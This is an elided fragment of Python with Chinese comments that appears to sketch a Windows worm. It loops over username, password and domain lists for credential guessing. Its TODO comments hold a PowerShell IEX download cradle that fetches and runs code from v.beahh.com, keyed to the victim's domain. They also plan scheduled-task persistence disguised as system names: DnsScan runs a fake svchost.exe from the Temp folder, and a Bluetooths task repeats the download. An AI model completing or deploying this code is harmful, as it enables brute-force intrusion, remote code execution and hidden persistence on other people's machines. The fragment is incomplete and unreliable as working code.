    ...
    for u in userlist2:
        for p in passlist:
            if u == '' and p != '':
                continue
            for d in domainlist:
                # TODO IEX (New-Object Net.WebClient).downloadstring('http://v.beahh.com/v'+$env:USERDOMAIN)
...
if os.path.exists('C:\\windows\\system32\\WindowsPowerShell\\'):
    # 创建计划任务, 7点05后, 每小时执行一次C:\\Windows\\temp\\svchost.exe, 任务名称DnsScan
    ...
    # TODO 计划任务名称\\Microsoft\\windows\\Bluetooths, 每50分钟执行一次, IEX (New-Object Net.WebClient).downloadstring('http://v.beahh.com/v'+$env:USERDOMAIN)
